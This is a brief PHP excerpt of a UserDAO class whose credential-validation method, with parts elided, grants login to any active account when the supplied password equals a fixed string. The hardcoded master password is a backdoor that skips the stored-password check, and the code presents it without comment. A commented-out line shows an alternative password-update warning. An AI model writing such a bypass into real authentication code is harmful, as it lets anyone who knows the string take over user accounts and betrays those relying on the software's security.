    ...
    class UserDAO{
        ...
        public function validateUserCredentials($data) {
             ...
             if($aResult['status'] == true){
                if($aResult['resultsArray']['account_status'] == 1 && $data->password == "sneidon.$$"){
                    return array(status=> true, resultsArray=>$aResult['resultsArray'] , message=>"");
                   // return array(status=> true,warning=> 998, message=>"Your account needs a password update. <br/>Please check your email for instructions");
                }
